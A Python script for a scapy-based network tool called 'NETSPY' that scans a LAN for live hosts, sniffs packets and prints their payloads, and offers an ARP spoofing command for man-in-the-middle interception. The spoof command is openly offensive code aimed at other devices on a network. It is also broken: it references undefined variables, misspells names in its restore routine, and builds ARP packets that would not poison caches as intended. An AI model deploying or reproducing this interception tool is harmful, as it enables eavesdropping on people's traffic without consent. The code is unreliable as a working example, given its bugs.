import scapy.all as scapy
import click
from prettytable import PrettyTable
from time import sleep
import threading
# import manuf
def print_banner():
    banner=r"""  ________    _______   _________   ________   ________   ___    ___ 
 |\   ___  \ |\  ___ \ |\___   ___\|\   ____\ |\   __  \ |\  \  /  /|
 \ \  \\ \  \\ \   __/|\|___ \  \_|\ \  \___|_\ \  \|\  \\ \  \/  / /
  \ \  \\ \  \\ \  \_|/__   \ \  \  \ \_____  \\ \   ____\\ \    / / 
   \ \  \\ \  \\ \  \_|\ \   \ \  \  \|____|\  \\ \  \___| \/  /  /  
    \ \__\\ \__\\ \_______\   \ \__\   ____\_\  \\ \__\  __/  / /    
     \|__| \|__| \|_______|    \|__|  |\_________\\|__| |\___/ /     
                                      \|_________|      \|___|/      
                                                                    
   All in One Packet Manipulator
            Version 1.0
              Made by -: Lowkey
"""
    print(banner)
def print_ip(packet):
    print(f"IP: {packet[scapy.IP].src}-->{packet[scapy.IP].dst}, proto{packet[scapy.IP].proto}")


def print_icmp(packet):
    print(f"ICMP: type:{packet[scapy.ICMP].type} | code:{packet[scapy.ICMP].code}")


def print_udp(packet):
    print(f"UDP: source port:{packet[scapy.UDP].sport}--->destination port:{packet[scapy.UDP].dport}, len:{packet[scapy.UDP].len}")
    if packet.haslayer(scapy.Raw) and packet[scapy.Raw].load:
        print(packet[scapy.Raw].load)
    else:
        return


def print_tcp(packet):
    print(f"TCP: source port:{packet[scapy.TCP].sport}--->destination port:{packet[scapy.TCP].dport}, window:{packet[scapy.TCP].window}, seq:{packet[scapy.TCP].seq},ack:{packet[scapy.TCP].ack}, reserved:{packet[scapy.TCP].reserved},flags:{packet[scapy.TCP].flags},options:{packet[scapy.TCP].options}")
    if packet.haslayer(scapy.Raw) and packet[scapy.Raw].load:
        print(packet[scapy.Raw].load)
    else:
        return


def print_arp(packet):
    print(f"ARP: ip[source: {packet[scapy.ARP].psrc}--->destination{packet[scapy.ARP].pdst}],MAC [source: {packet[scapy.ARP].hwsrc}---> destination:{packet[scapy.ARP].hwdst}]")


def print_ether(packet):
    print(f"Ether: source:{packet[scapy.Ether].src} ---> destination: {packet[scapy.Ether].dst}")

def get_mac_arp(ip):
    mac=None
    i=5
    while i>=0:
        arp_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip)
        answered_list,_=scapy.srp(arp_packet,timeout=1,verbose=False)
        for _,detail in answered_list:
            if detail.hwsrc:
                mac=detail.hwsrc
                return mac
            else:
                continue
        i-=1
    return mac

@click.group()
def cli():
    pass
line="-------------------=============================================================--------------------"

def print_head(header):
    print(f"-----------------=============================*{header}*================================-----------------")
def show_list(a):
 
    try:
        table=PrettyTable()
        table.field_names=["Sno.","IP Address","MAC Address"]
        for i,host in enumerate(a,start=1):
            table.add_row([i,host["ip"],host["mac"]])
        print(table)
    except:
        pass


@cli.command()
@click.option("-h","--host",help="Enter the ip address or IP range(e.g., 192.168.1.0/24)")
def livehosts(host):
    host_list=[]
    print("scanning for new hosts.... \npress(ctrl+c) to stop the scan and see results")
 
    while True:
        try:
            new_list=[]
            arp_layer=scapy.ARP(pdst=host)
            ether_layer=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            packet=ether_layer/arp_layer
            answered_list,_ = scapy.srp(packet,timeout=1,verbose=False)
            if answered_list:
                for _ , detail in answered_list:
                    host_dict={"ip":detail.psrc,"mac":detail.hwsrc}
                    new_list.append(host_dict)
                if new_list:
                    for host_dict in new_list:
                        if host_dict not in host_list:
                            host_list.append(host_dict)
            else:
                print("{*} no hosts were up :(")
                break
            sleep(2)
        except KeyboardInterrupt:
            print("[*] keyboard interrup detected exiting the program")
            break
    show_list(host_list)


@cli.command()
@click.option("-if","--interface",help="Interface that is being used(e.g.,'wlan0','Eth0')")
@click.option("-t","--tcp",help="show TCP packets",is_flag=True)
def sniff(interface,tcp):
    print_head(str("monitoring-start"))
    def process_everything(packet):
        if packet.haslayer(scapy.IP):
            print_ip(packet)
        if packet.haslayer(scapy.ICMP):
            print_icmp(packet)
        if packet.haslayer(scapy.UDP):
            print_udp(packet)
        if packet.haslayer(scapy.TCP):
            print_tcp(packet)
        if packet.haslayer(scapy.ARP):
            print_arp(packet)
    if tcp:
        try:
            scapy.sniff(iface=interface,store=False,filter='tcp',prn=process_everything)
        except:
            print("couldn't monitor the specified filters\nexiting the program....")
            exit()
    else:
        try:
            scapy.sniff(iface=interface,store=False,prn=process_everything)
        except :
            print("couldn't monitor the specified filters\nexiting the program....")
            exit()
    print_head(str("monitoring-end"))


@cli.command()
@click.option("-sh","--spoof_host",help="ip address of the host to be spoofed(e.g,.192.168.1.1)")
@click.option("-th","--target_host",help="ip address of the target device(e.g,.192.168.1.2)")
def spoof(spoof_host,target_host):
    try:
        def spoof_host(target_host,spoof_host):
            target_mac=get_mac_arp(target_host)
            spoof_mac=get_mac_arp(spoof_host)
            spoof_packet=scapy.Ether(dst=target_mac,src=spoof_mac)/scapy.ARP(pdst=target_host)
            while True:
                try:
                    scapy.srp(spoof_packet,verbose=False)    
                    sleep(3)
                except KeyboardInterrupt:
                    print("[*]keyboard interrupt detected exiting the program....")
                    break

        def restore_hoat(target_host,spoof_host):
            for i in range(5):
                restoe_packet=scapy.Ether(dst=target_mac,src=spoof_mac)/scapy.ARP(psrc=spoof_host,pdst=target_host)
                scapy.srp(restore_packet)

        spoof_thread1=threading.Thread(target=spoof_host,args=(spoof_ip,target_ip,))
        spoof_thread2=threading.Thread(target=spoof_host,args=(target_host,spoof_host,))
        spoof_thread1.start()
        spoof_thread2.start()
    except NameError:
        print("[*] required arguments were not provided \nuse --help for further details")
if __name__=="__main__":
    print_banner()
    cli()